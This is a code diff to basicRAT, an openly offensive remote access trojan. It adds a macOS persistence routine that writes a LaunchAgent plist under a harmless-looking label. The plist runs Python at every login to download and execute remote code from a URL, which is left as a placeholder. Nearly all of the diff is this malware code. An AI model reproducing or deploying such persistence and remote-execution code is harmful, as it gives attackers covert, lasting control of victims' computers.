@@ -3,7 +3,7 @@
 # https://github.com/vesche/basicRAT
 #
 
-import sys
+import sys, os
 
 def windows_persistence():
     import os, string, random
@@ -43,7 +43,27 @@ def linux_persistence():
 
 
 def mac_persistence():
-    return False, 'nothing here yet'
+    with open(os.path.expanduser("~") + "/Library/LaunchAgents/groundtime.plist", "w") as f:
+        f.write("""
+            <?xml version="1.0" encoding="UTF-8"?>
+            <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+            <plist version="1.0">
+            <dict>
+                <key>Label</key>
+                <string>com.example.hello</string>
+                <key>ProgramArguments</key>
+                <array>
+                    <string>/usr/bin/python</string>
+                    <string>-c</string>
+                    <string>import urllib;exec urllib.urlopen("###TODO").read()</string>
+                </array>
+                <key>RunAtLoad</key>
+                <true/>
+            </dict>
+            </plist>
+        """)
+
+    return True, 'startup file add success'
 
 
 def run(plat):
